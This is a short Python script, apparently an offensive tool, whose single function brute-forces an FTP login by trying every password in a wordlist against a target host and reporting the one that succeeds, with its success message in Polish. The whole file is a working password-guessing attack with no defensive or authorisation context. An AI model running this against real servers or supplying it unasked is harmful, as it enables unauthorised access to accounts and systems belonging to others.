from ftplib import FTP, error_perm

def ftp_bruteforce(host, username, wordlist_path, port=21):
    with open(wordlist_path) as f:
        for line in f:
            password = line.strip()
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=3)
                ftp.login(user=username, passwd=password)
                print(f"[+] FTP Zalogowano: {username}:{password}")
                ftp.quit()
                return password
            except error_perm:
                pass
            except Exception:
                pass

    return None
